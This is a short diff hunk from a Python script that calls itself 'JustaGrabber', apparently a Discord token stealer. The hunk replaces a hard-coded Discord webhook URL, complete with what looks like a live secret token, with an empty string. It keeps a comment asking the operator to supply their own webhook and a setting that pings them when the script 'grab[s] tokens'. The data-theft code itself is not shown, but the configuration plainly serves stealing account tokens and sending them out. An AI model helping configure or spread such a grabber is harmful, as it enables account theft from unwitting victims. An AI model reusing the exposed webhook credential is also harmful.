@@ -19,7 +19,7 @@ except ModuleNotFoundError: # If requests module not exists, JustaGrabber will n
 
 import os, re, json, urllib.request,datetime,random # Importing modules
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/930357648795242500/d7pP8aCCCtdhh80BVsgQMkBdvIkHXwESclaGh-dCSULBQrRM4TFeNBCjV4OXIixyVtLQ'
+WEBHOOK_URL = ''
 # Type your discord webhook url over here 
 
 Ping_me = True # IF true, Your webhook will mention you when it grab tokens.
